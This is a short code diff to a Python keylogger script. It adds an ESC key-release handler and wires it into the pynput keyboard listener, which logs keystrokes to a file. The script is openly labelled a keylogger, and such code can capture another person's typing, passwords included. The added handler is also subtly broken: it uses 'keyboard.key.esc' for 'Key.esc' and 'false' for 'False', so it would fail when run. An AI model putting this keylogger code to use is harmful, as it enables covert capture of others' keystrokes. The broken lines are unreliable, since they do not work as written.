@@ -27,13 +27,16 @@ def on_press(key):
         # Log errors to avoid crashing
         with open(LOG_FILE, "a") as f:
             f.write(f"[{timestamp}] Error: {str(e)}\n")
-
+def on_release(key):
+    #Handle key release to exit on ESC.
+    if key == keyboard.key.esc:
+        return false #stop listener
 def main():
     print("Keylogger started. Press ESC to stop.")
     print(f"Keystrokes will be logged to {LOG_FILE}")
     
     # Create listener for key presses
-    with keyboard.Listener(on_press=on_press) as listener:
+    with keyboard.Listener(on_press=on_press , on_release=on_release) as listener:
         listener.join()
 
 if __name__ == "__main__":
